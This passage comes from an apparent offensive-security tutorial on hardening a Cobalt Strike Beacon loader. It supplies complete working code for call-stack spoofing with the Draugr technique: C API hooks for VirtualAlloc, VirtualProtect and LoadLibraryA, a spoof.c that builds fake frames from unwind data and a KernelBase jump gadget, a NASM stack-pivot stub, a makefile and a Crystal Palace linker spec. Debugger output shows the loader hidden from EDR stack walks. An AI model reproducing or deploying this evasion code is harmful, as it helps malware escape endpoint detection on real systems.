02 00000071`73fff808 00000071`73fff830     0x00000071`73fff830
03 00000071`73fff810 00000000`0000000a     0x00000071`73fff830
04 00000071`73fff818 00000000`0000000d     0xa
05 00000071`73fff820 00000071`73fff8e0     0xd
06 00000071`73fff828 00007ffa`7b071734     0x00000071`73fff8e0

The fix is call-stack spoofing, based on the Draugr technique. Two pieces:

  1. Hooks — redirect target API calls into the spoof proxy
  2. Spoofer — craft the fake stack frames, find a gadget, push the call through
3.10.1.1 Hooks

The APIs that matter in this loader are VirtualAlloc, VirtualProtect (DLL loading), and LoadLibraryA (resolving imports). Define hook functions in hooks.c with matching prototypes — including the WINAPI (__stdcall) decoration that user-mode APIs use:

# Child-SP          RetAddr               Call Site
00 00000071`73fff7f8 00000184`8ed00070     KERNELBASE!VirtualAlloc
01 00000071`73fff800 00000071`73fff830     0x00000184`8ed00070
02 00000071`73fff808 00000071`73fff830     0x00000071`73fff830
03 00000071`73fff810 00000000`0000000a     0x00000071`73fff830
04 00000071`73fff818 00000000`0000000d     0xa
05 00000071`73fff820 00000071`73fff8e0     0xd
06 00000071`73fff828 00007ffa`7b071734     0x00000071`73fff8e0
#include <windows.h>

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect )
{
    // TODO
}

BOOL WINAPI _VirtualProtect ( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    // TODO
}

HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
{
    // TODO
}

Crystal Palace's attach command in the spec file redirects DFR references to the hook functions. Merge the hooks COFF and attach each target:

x64:
    load "bin/loader.x64.o"
        make pic +gofirst

    ...

    load "bin/hooks.x64.o"  # read the hooks COFF
        merge               # merge into the loader PIC

    # hook the required APIs
    attach "KERNEL32$VirtualAlloc"   "_VirtualAlloc"
    attach "KERNEL32$VirtualProtect" "_VirtualProtect"
    attach "KERNEL32$LoadLibraryA"   "_LoadLibraryA"

    export

Before attach, the loader COFF references the DFR symbol directly:

000000000000005B 488B0500000000   mov    __imp_KERNEL32$VirtualAlloc,%rax
0000000000000062 FFD0             call   *%rax

After linking, the call is rewritten to the hook:

00000000000000A3 E802130000   call   _VirtualAlloc

The hooks delegate to a generic spoof_call defined in spoof.h. It takes a FUNCTION_CALL containing the target function pointer, arg count, and up to ten arguments:

typedef struct {
    PVOID     function;
    int       argc;
    ULONG_PTR args [ 10 ];
} FUNCTION_CALL;

ULONG_PTR spoof_call ( FUNCTION_CALL * call );

Each hook packs its arguments into the struct and invokes spoof_call. The hooks don't know how the spoofing is implemented — only the contract. Different spoofing implementations can be swapped in at link time:

#include <windows.h>
#include "spoof.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect )
{
    FUNCTION_CALL call = { 0 };
    
    call.function = ( PVOID ) ( KERNEL32$VirtualAlloc );
    call.argc     = 4;

    call.args [ 0 ] = ( ULONG_PTR ) ( lpAddress );
    call.args [ 1 ] = ( ULONG_PTR ) ( dwSize );
    call.args [ 2 ] = ( ULONG_PTR ) ( flAllocationType );
    call.args [ 3 ] = ( ULONG_PTR ) ( flProtect );

    return ( LPVOID ) spoof_call ( &call );
}

BOOL WINAPI _VirtualProtect ( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    FUNCTION_CALL call = { 0 };
    
    call.function = ( PVOID ) ( KERNEL32$VirtualProtect );
    call.argc     = 4;

    call.args [ 0 ] = ( ULONG_PTR ) ( lpAddress );
    call.args [ 1 ] = ( ULONG_PTR ) ( dwSize );
    call.args [ 2 ] = ( ULONG_PTR ) ( flNewProtect );
    call.args [ 3 ] = ( ULONG_PTR ) ( lpflOldProtect );

    return ( BOOL ) spoof_call ( &call );
}

HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
{
    FUNCTION_CALL call = { 0 };
    
    call.function = ( PVOID ) ( LoadLibraryA );
    call.argc     = 1;

    call.args [ 0 ] = ( ULONG_PTR ) ( lpLibFileName );

    return ( HMODULE ) spoof_call ( &call );
}

3.10.1.2 Spoof

The spoofing implementation is provided by Draugr, a call stack spoofing technique that builds a synthetic call stack by chaining together three legitimate frames: RtlUserThreadStart, BaseThreadInitThunk, and a JOP gadget (jmp QWORD PTR [rbx]) inside KernelBase.dll. When EDR walks the stack at the moment of the API call, it sees what looks like a normal thread entry chain instead of Beacon's loader.

The synthetic stack, top to bottom:

FrameWhat sits thereWhy
(top) the call targete.g. VirtualAllocWhatever Beacon wanted to call
Gadget frameAn address inside KernelBase.dll with a jmp QWORD PTR [rbx] instructionBridges back into a legitimate module so the unwinder finds valid .pdata. JOP-style: the gadget reads its next "return address" from rbx which we control.
BaseThreadInitThunk framekernel32!BaseThreadInitThunk+0x17Real return address used by every thread Windows creates
RtlUserThreadStart framentdll!RtlUserThreadStart+0x2cThe bottom of every thread's stack on Windows. EDR sees this and stops walking.

Why each piece exists:

  • The two thread-init frames are what every legitimate Windows thread has at the bottom of its stack. They make the spoofed chain look like a normal thread that just happens to be calling an API.
  • The gadget frame is the trick. Without it, the unwinder would walk from BaseThreadInitThunk+0x17 straight into Beacon's caller — which is in unbacked memory and breaks the chain. By inserting a frame whose return address is a real instruction inside a real module (KernelBase), the unwinder finds .pdata for it, unwinds successfully, and ends up at BaseThreadInitThunk. The actual instruction at the gadget (jmp [rbx]) never runs — it just needs to exist at a valid address.
  • The stack-size calculation matters because each frame has to consume exactly the right number of bytes on the stack. RtlLookupFunctionEntry + UNWIND_INFO parsing tell us how much each function's prologue allocates — we then sub rsp, <size> by that exact amount before placing the next return address.

The full spoof.c implementation defines the unwind structures and helper functions that locate frames, calculate stack sizes from unwind data, and find a usable gadget:

#include <windows.h>
#include "tcg.h"
#include "spoof.h"

DECLSPEC_IMPORT HMODULE           WINAPI KERNEL32$GetModuleHandleA       ( LPCSTR );
DECLSPEC_IMPORT PRUNTIME_FUNCTION WINAPI KERNEL32$RtlLookupFunctionEntry ( DWORD64, PDWORD64, PUNWIND_HISTORY_TABLE );
DECLSPEC_IMPORT ULONG             NTAPI  NTDLL$RtlRandomEx               ( PULONG );

#define RBP_OP_INFO 0x5
#define TEXT_HASH   0xEBC2F9B4

#define draugr_arg(i) ( ULONG_PTR ) call->args [ i ]

typedef struct {
    LPCWSTR   DllPath;
    ULONG     Offset;
    ULONGLONG TotalStackSize;
    BOOL      RequiresLoadLibrary;
    BOOL      SetsFramePointer;
    PVOID     ReturnAddress;
    BOOL      PushRbp;
    ULONG     CountOfCodes;
    BOOL      PushRbpIndex;
} STACK_FRAME;

typedef enum {
    UWOP_PUSH_NONVOL = 0,
    UWOP_ALLOC_LARGE,
    UWOP_ALLOC_SMALL,
    UWOP_SET_FPREG,
    UWOP_SAVE_NONVOL,
    UWOP_SAVE_NONVOL_FAR,
    UWOP_SAVE_XMM128 = 8,
    UWOP_SAVE_XMM128_FAR,
    UWOP_PUSH_MACHFRAME
} UNWIND_CODE_OPS;

typedef unsigned char UBYTE;

typedef union {
    struct {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE;

typedef struct {
    UBYTE Version : 3;
    UBYTE Flags   : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode [ 1 ];
} UNWIND_INFO;

typedef struct {
    PVOID ModuleAddress;
    PVOID FunctionAddress;
    DWORD Offset;
} FRAME_INFO;

typedef struct {
    FRAME_INFO BaseThreadInitThunk;
    FRAME_INFO RtlUserThreadStart;
    PVOID      Gadget;
} SYNTHETIC_STACK_FRAME;

typedef struct {
    FUNCTION_CALL * FunctionCall;
    PVOID           StackFrame;
    PVOID           SpoofCall;
} DRAUGR_FUNCTION_CALL;

typedef struct {
    PVOID Fixup;
    PVOID OriginalReturnAddress;
    PVOID Rbx;
    PVOID Rdi;
    PVOID BaseThreadInitThunkStackSize;
    PVOID BaseThreadInitThunkReturnAddress;
    PVOID TrampolineStackSize;
    PVOID RtlUserThreadStartStackSize;
    PVOID RtlUserThreadStartReturnAddress;
    PVOID Ssn;
    PVOID Trampoline;
    PVOID Rsi;
    PVOID R12;
    PVOID R13;
    PVOID R14;
    PVOID R15;
} DRAUGR_PARAMETERS;

/**
 * Get information needed to craft the fake stack frames.
 * Uses Kernel32!BaseThreadInitThunk+0x17, ntdll!RtlUserThreadStart+02c
 * and a gadget from KernelBase.dll by default.
 */
void init_frame_info ( SYNTHETIC_STACK_FRAME * frame )
{
    PVOID kernel32 = KERNEL32$GetModuleHandleA ( "kernel32.dll" );
    PVOID ntdll    = KERNEL32$GetModuleHandleA ( "ntdll.dll" );

    frame->BaseThreadInitThunk.ModuleAddress   = kernel32;
    frame->BaseThreadInitThunk.FunctionAddress = ( PVOID ) GetProcAddress ( ( HMODULE ) kernel32, "BaseThreadInitThunk" );
    frame->BaseThreadInitThunk.Offset          = 0x17;

    frame->RtlUserThreadStart.ModuleAddress   = ntdll;
    frame->RtlUserThreadStart.FunctionAddress = ( PVOID ) GetProcAddress ( ( HMODULE ) ntdll, "RtlUserThreadStart" );
    frame->RtlUserThreadStart.Offset          = 0x2c;

    frame->Gadget = KERNEL32$GetModuleHandleA ( "KernelBase.dll" );
}

/**
 * Get the size of a module's .text section
 */
BOOL get_text_section_size ( PVOID module, PDWORD virtual_addr, PDWORD size )
{
    IMAGE_DOS_HEADER * dos_header = ( IMAGE_DOS_HEADER * ) ( module );
    
    if ( dos_header->e_magic != IMAGE_DOS_SIGNATURE ) {
        return FALSE;
    }

    IMAGE_NT_HEADERS * nt_headers = ( IMAGE_NT_HEADERS * ) ( ( UINT_PTR ) module + dos_header->e_lfanew );
    
    if ( nt_headers->Signature != IMAGE_NT_SIGNATURE ) {
        return FALSE;
    }

    IMAGE_SECTION_HEADER * section_header = IMAGE_FIRST_SECTION ( nt_headers );
    
    for ( int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++ )
    {
        DWORD h = ror13hash ( ( char * ) section_header[ i ].Name );

        if ( h == TEXT_HASH )
        {
            * virtual_addr = section_header[ i ].VirtualAddress;
            * size         = section_header[ i ].SizeOfRawData;
            
            return TRUE;
        }
    }

    return FALSE;
}

/**
 * Calculate the required stack frame size of
 * a function based on its unwind information.
 */
PVOID calculate_function_stack_size( RUNTIME_FUNCTION * runtime_function, const DWORD64 image_base )
{
    UNWIND_INFO * unwind_info = NULL;
    ULONG unwind_operation    = 0;
    ULONG operation_info      = 0;
    ULONG index               = 0;
    ULONG frame_offset        = 0;

    STACK_FRAME stack_frame = { 0 };

    if ( ! runtime_function ) {
        return NULL;
    }

    unwind_info = ( UNWIND_INFO * ) ( runtime_function->UnwindData + image_base );
    
    while ( index < unwind_info->CountOfCodes )
    {
        unwind_operation = unwind_info->UnwindCode[ index ].UnwindOp;
        operation_info   = unwind_info->UnwindCode[ index ].OpInfo;

        /* don't use switch as it produces jump tables */
        if ( unwind_operation == UWOP_PUSH_NONVOL )
        {
            stack_frame.TotalStackSize += 8;

            if ( RBP_OP_INFO == operation_info )
            {
                stack_frame.PushRbp      = TRUE;
                stack_frame.CountOfCodes = unwind_info->CountOfCodes;
                stack_frame.PushRbpIndex = index + 1;
            }
        }
        else if ( unwind_operation == UWOP_SAVE_NONVOL )
        {
            index += 1;
        }
        else if ( unwind_operation == UWOP_ALLOC_SMALL )
        {
            stack_frame.TotalStackSize += ( ( operation_info * 8 ) + 8 );
        }
        else if ( unwind_operation == UWOP_ALLOC_LARGE )
        {
            index += 1;
            frame_offset = unwind_info->UnwindCode[ index ].FrameOffset;
            
            if ( operation_info == 0 )
            {
                frame_offset *= 8;
            }
            else 
            {
                index += 1;
                frame_offset += ( unwind_info->UnwindCode[ index ].FrameOffset << 16 );
            }

            stack_frame.TotalStackSize += frame_offset;
        }
        else if ( unwind_operation == UWOP_SET_FPREG )
        {
            stack_frame.SetsFramePointer = TRUE;
        }
        else if ( unwind_operation == UWOP_SAVE_XMM128 )
        {
            return NULL;
        }

        index += 1;
    }

    if ( ( unwind_info->Flags & UNW_FLAG_CHAININFO ) != 0 )
    {
        index = unwind_info->CountOfCodes;

        if ( 0 != ( index & 1 ) ) {
            index += 1;
        }

        runtime_function = ( RUNTIME_FUNCTION * ) ( &unwind_info->UnwindCode[ index ] );
        return calculate_function_stack_size ( runtime_function, image_base );
    }

    stack_frame.TotalStackSize += 8;
    return ( PVOID ) ( stack_frame.TotalStackSize );
}

PVOID calculate_function_stack_size_wrapper ( PVOID return_address )
{
    RUNTIME_FUNCTION     * runtime_function = NULL;
    DWORD64                image_base       = 0;
    UNWIND_HISTORY_TABLE * history_table    = NULL;

    if ( ! return_address ) {
        return NULL;
    }

    runtime_function = KERNEL32$RtlLookupFunctionEntry ( ( DWORD64 ) return_address, &image_base, history_table );

    if ( runtime_function == NULL ) {
        return NULL;
    }

    return calculate_function_stack_size ( runtime_function, image_base );
}

/**
 * Find a suitable jmp QWORD PTR [rbx]
 * gadget in the given module
 */
PVOID find_gadget ( PVOID module )
{
    BOOL found_gadgets      = FALSE;
    DWORD text_section_size = 0;
    DWORD text_section_va   = 0;
    DWORD counter           = 0;
    ULONG seed              = 0;
    ULONG random_num        = 0;
    PVOID mod_text_section  = NULL;

    PVOID gadget_list [ 15 ] = { 0 };

    if ( ! found_gadgets )
    {
        if ( ! get_text_section_size ( module, &text_section_va, &text_section_size ) ) {
            return NULL;
        }

        mod_text_section = ( PBYTE ) ( ( UINT_PTR ) module + text_section_va );

        for ( int i = 0; i < ( text_section_size - 2 ); i++ )
        {
            /* x64 opcodes are ff 23 */
            if ( ( ( PBYTE ) mod_text_section ) [ i ] == 0xFF && ( ( PBYTE ) mod_text_section ) [ i + 1 ] == 0x23 )
            {
                gadget_list [ counter ] = ( PVOID ) ( ( UINT_PTR ) mod_text_section + i );
                counter++;

                if ( counter == 15 ) {
                    break;
                }
            }
        }

        found_gadgets = TRUE;
    }

    seed       = 0x1337;
    random_num = NTDLL$RtlRandomEx ( &seed );
    random_num %= counter;

    return gadget_list [ random_num ];
}

/* implemented in draugr.asm */
extern PVOID draugr_stub ( );

ULONG_PTR draugr_wrapper ( PVOID function_ptr, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8, PVOID arg9, PVOID arg10, PVOID arg11, PVOID arg12 )
{
    int attempts         = 0;
    PVOID return_address = NULL;

    /* 
     * get information required to 
     * craft the fake stack frames
     */
    SYNTHETIC_STACK_FRAME frame = { 0 };
    init_frame_info ( &frame );

    DRAUGR_PARAMETERS draugr_params = { 0 };

    /*
     * calculate the return address of the fake BaseThreadInitThunk 
     * stack frame and the correct stack frame size
     */
    return_address                                 = ( PVOID ) ( ( UINT_PTR ) frame.BaseThreadInitThunk.FunctionAddress + frame.BaseThreadInitThunk.Offset );
    draugr_params.BaseThreadInitThunkStackSize     = calculate_function_stack_size_wrapper ( return_address );
    draugr_params.BaseThreadInitThunkReturnAddress = return_address;

    if ( ! draugr_params.BaseThreadInitThunkStackSize || ! draugr_params.BaseThreadInitThunkReturnAddress ) {
        return ( ULONG_PTR ) ( NULL );
    }

    /*
     * calculate the return address of the fake RtlUserThreadStart 
     * stack frame and the correct stack frame size
     */
    return_address                                = ( PVOID ) ( (UINT_PTR ) frame.RtlUserThreadStart.FunctionAddress + frame.RtlUserThreadStart.Offset );
    draugr_params.RtlUserThreadStartStackSize     = calculate_function_stack_size_wrapper ( return_address );
    draugr_params.RtlUserThreadStartReturnAddress = return_address;

    if ( ! draugr_params.RtlUserThreadStartStackSize || ! draugr_params.RtlUserThreadStartReturnAddress ) {
        return (ULONG_PTR)(NULL);
    }

    /*
     * try to find a suitable gadget frame.
     * we abort after 15 tries.
     */
    do
    {
        draugr_params.Trampoline          = find_gadget ( frame.Gadget );
        draugr_params.TrampolineStackSize = calculate_function_stack_size_wrapper ( draugr_params.Trampoline );
        
        attempts++;

        if ( attempts > 15 ) {
            return ( ULONG_PTR ) ( NULL );
        }
                                                              /* 0x80 is the minimum safe stack size for 10 args */
    } while ( draugr_params.TrampolineStackSize == NULL || ( ( __int64 ) draugr_params.TrampolineStackSize < 0x80 ) );

    if ( ! draugr_params.Trampoline || ! draugr_params.TrampolineStackSize ) {
        return ( ULONG_PTR ) ( NULL );
    }

    /* make the call */
    return ( ULONG_PTR ) draugr_stub ( arg1, arg2, arg3, arg4, &draugr_params, function_ptr, 8, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12 );
}

/**
 * Stack spoof an API call via Draugr
 */
ULONG_PTR spoof_call ( FUNCTION_CALL * call )
{
    if ( call->argc == 0 ) {
        return draugr_wrapper ( call->function, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 1 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if ( call->argc == 2 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if ( call->argc == 3 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if ( call->argc == 4 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if ( call->argc == 5 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    } else if ( call->argc == 6 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), NULL, NULL, NULL, NULL, NULL, NULL);
    } else if ( call->argc == 7 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), NULL, NULL, NULL, NULL, NULL);
    } else if ( call->argc == 8 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), NULL, NULL, NULL, NULL);
    } else if ( call->argc == 9 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), NULL, NULL, NULL);
    } else if ( call->argc == 10 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), ( PVOID ) draugr_arg ( 9 ), NULL, NULL);
    } else if ( call->argc == 11 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), ( PVOID ) draugr_arg ( 9 ), ( PVOID ) draugr_arg ( 10 ), NULL);
    } else if ( call->argc == 12 ) {
        return draugr_wrapper ( call->function, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), ( PVOID ) draugr_arg ( 9 ), ( PVOID ) draugr_arg ( 10 ), ( PVOID ) draugr_arg ( 11 ) );
    } else {
        return ( ULONG_PTR ) ( NULL );
    }
}

The actual stack pivot has to happen in assembly so we can directly control rsp. The draugr.asm stub saves the original registers, lays down the synthetic RtlUserThreadStart → BaseThreadInitThunk → gadget frames on the stack, performs the call, and then restores everything via a fixup routine:

[BITS 64]

    draugr_stub:
        pop rax                  ; Real return address in rax

        mov r10, rdi             ; Store OG rdi in r10
        mov r11, rsi             ; Store OG rsi in r11

        mov rdi, [ rsp + 32 ]    ; Storing struct in rdi
        mov rsi, [ rsp + 40 ]    ; Storing function to call

        ; ---------------------------------------------------------------------
        ; Storing our original registers
        ; ---------------------------------------------------------------------

        mov [ rdi + 24 ], r10     ; Storing OG rdi into param
        mov [ rdi + 88 ], r11     ; Storing OG rsi into param
        mov [ rdi + 96 ], r12     ; Storing OG r12 into param
        mov [ rdi + 104 ], r13    ; Storing OG r13 into param
        mov [ rdi + 112 ], r14    ; Storing OG r14 into param
        mov [ rdi + 120 ], r15    ; Storing OG r15 into param

        mov r12, rax              ; OG code used r12 for ret addr

        ; ---------------------------------------------------------------------
        ; Prepping to move stack args
        ; ---------------------------------------------------------------------

        xor r11, r11               ; r11 will hold the # of args that have been "pushed"
        mov r13, [ rsp + 0x30 ]    ; r13 will hold the # of args total that will be pushed

        mov r14, 0x200             ; r14 will hold the offset we need to push stuff
        add r14, 8
        add r14, [ rdi + 56 ]      ; stack size of RUTS
        add r14, [ rdi + 48 ]      ; stack size of BTIT
        add r14, [ rdi + 32 ]      ; stack size of our gadget frame
        sub r14, 0x20              ; first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time

        mov r10, rsp            
        add r10, 0x30              ; offset of stack arg added to rsp

        looping:
            xor r15, r15      ; r15 will hold the offset + rsp base
            cmp r11d, r13d    ; comparing # of stack args added vs # of stack args we need to add
            je finish
        
            ; ---------------------------------------------------------------------
            ; Getting location to move the stack arg to
            ; ---------------------------------------------------------------------
            
            sub r14, 8      ; 1 arg means r11 is 0, r14 already 0x28 offset.
            mov r15, rsp    ; get current stack base
            sub r15, r14    ; subtract offset
            
            ; ---------------------------------------------------------------------
            ; Procuring the stack arg
            ; ---------------------------------------------------------------------
            
            add r10, 8

            push qword [ r10 ]
            pop qword [ r15 ]   

            ; ---------------------------------------------------------------------
            ; Increment the counter and loop back in case we need more args
            ; ---------------------------------------------------------------------
            add r11, 1
            jmp looping
            
        finish:

        ; ----------------------------------------------------------------------
        ; Creating a big 320 byte working space
        ; ----------------------------------------------------------------------

        sub rsp, 0x200

        ; ----------------------------------------------------------------------
        ; Pushing a 0 to cut off the return addresses after RtlUserThreadStart.
        ; Need to figure out why this cuts off the call stack
        ; ----------------------------------------------------------------------

        push 0

        ; ----------------------------------------------------------------------
        ; RtlUserThreadStart frame
        ; ----------------------------------------------------------------------
        
        sub rsp, [ rdi + 56 ]
        mov r11, [ rdi + 64 ]
        mov [ rsp ], r11
                
        ; ----------------------------------------------------------------------
        ; BaseThreadInitThunk frame
        ; ----------------------------------------------------------------------

        sub rsp, [ rdi + 32 ]
        mov r11, [ rdi + 40 ]
        mov [ rsp ], r11

        ; ----------------------------------------------------------------------
        ; Gadget frame
        ; ----------------------------------------------------------------------
        
        sub rsp, [ rdi + 48 ]
        mov r11, [ rdi + 80 ]
        mov [ rsp ], r11

        ; ----------------------------------------------------------------------
        ; Adjusting the param struct for the fixup
        ; ----------------------------------------------------------------------

        mov r11, rsi              ; Copying function to call into r11

        mov [ rdi + 8 ], r12      ; Real return address is now moved into the "OG_retaddr" member
        mov [ rdi + 16 ], rbx     ; original rbx is stored into "rbx" member
        lea rbx, [ rel fixup ]    ; Fixup address is moved into rbx
        mov [ rdi ], rbx          ; Fixup member now holds the address of Fixup
        mov rbx, rdi              ; Address of param struct (Fixup) is moved into rbx

        ; ----------------------------------------------------------------------
        ; Syscall stuff. Shouldn't affect performance even if a syscall isnt made
        ; ----------------------------------------------------------------------
        mov r10, rcx
        mov rax, [ rdi + 72 ]
        
        jmp r11

        fixup:
            mov rcx, rbx
            add rsp, 0x200           ; Big frame thing
            add rsp, [ rbx + 48 ]    ; Stack size
            add rsp, [ rbx + 32 ]    ; Stack size
            add rsp, [ rbx + 56 ]    ; Stack size

            mov rbx, [ rcx + 16 ]     ; Restoring OG RBX
            mov rdi, [ rcx + 24 ]     ; ReStoring OG rdi
            mov rsi, [ rcx + 88 ]     ; ReStoring OG rsi
            mov r12, [ rcx + 96 ]     ; ReStoring OG r12
            mov r13, [ rcx + 104 ]    ; ReStoring OG r13 
            mov r14, [ rcx + 112 ]    ; ReStoring OG r14
            mov r15, [ rcx + 120 ]    ; ReStoring OG r15 
            push rax

            xor rax, rax 
            pop rax
            jmp QWORD [ rcx + 8 ]

The makefile builds the loader, services, hooks, and spoof COFFs plus the assembly stub:

CC_64=x86_64-w64-mingw32-gcc
NASM=nasm

all: bin/loader.x64.o

bin:
	mkdir bin

bin/loader.x64.o: bin
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/loader.c   -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/services.c -o bin/services.x64.o
    $(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/hooks.c    -o bin/hooks.x64.o	
    $(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/spoof.c    -o bin/spoof.x64.o
	$(NASM) src/draugr.asm -o bin/draugr.x64.bin

clean:
	rm -f bin/*

The loader spec wires everything together: merge the hooks and spoof COFFs into the loader PIC, link the assembly stub via linkfunc, and attach each target API to its hook:

x64:
    load "bin/loader.x64.o"
        make pic +gofirst +optimize
        
    ...
    
    load "bin/hooks.x64.o"     # load and merge the hooks COFF
        merge
    
    load "bin/spoof.x64.o"     # load and merge the spoof COFF
        merge

    load "bin/draugr.x64.bin"  # load and link the assembly stub
        linkfunc "draugr_stub"

    # hook the APIs
    attach "KERNEL32$VirtualAlloc"   "_VirtualAlloc"
    attach "KERNEL32$VirtualProtect" "_VirtualProtect"
    attach "KERNEL32$LoadLibraryA"   "_LoadLibraryA"

    push $DLL
        link "dll"
    
    export

After rebuilding, all three hooked APIs return synthetic stacks rooted at BaseThreadInitThunk and RtlUserThreadStart, with the gadget frame in KernelBase as the intermediate caller. The Beacon loader is no longer visible anywhere on the stack:

# Child-SP          RetAddr               Call Site
00 000000b8`ff3fdf58 00007ffb`45057633     KERNELBASE!VirtualAlloc
01 000000b8`ff3fdf60 00007ffb`4774e8d7     KERNELBASE!GetSortNode+0x1a33
02 000000b8`ff3ff5a0 00007ffb`47d2c53c     KERNEL32!BaseThreadInitThunk+0x17
03 000000b8`ff3ff5d0 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

 # Child-SP          RetAddr               Call Site
00 000000b8`ff3ff408 00007ffb`4515fa5a     KERNELBASE!LoadLibraryA
01 000000b8`ff3ff410 00007ffb`4774e8d7     KERNELBASE!GetConsoleAliasInternal+0xda
02 000000b8`ff3ff500 00007ffb`47d2c53c     KERNEL32!BaseThreadInitThunk+0x17
03 000000b8`ff3ff530 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

 # Child-SP          RetAddr               Call Site
00 00000035`fd5ff2f8 00007ffb`4513db02     KERNELBASE!VirtualProtect
01 00000035`fd5ff300 00007ffb`4774e8d7     KERNELBASE!Internal_EnumSystemCodePages+0x52
02 00000035`fd5ff600 00007ffb`47d2c53c     KERNEL32!BaseThreadInitThunk+0x17
03 00000035`fd5ff630 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

3.10.2 Call me maybe

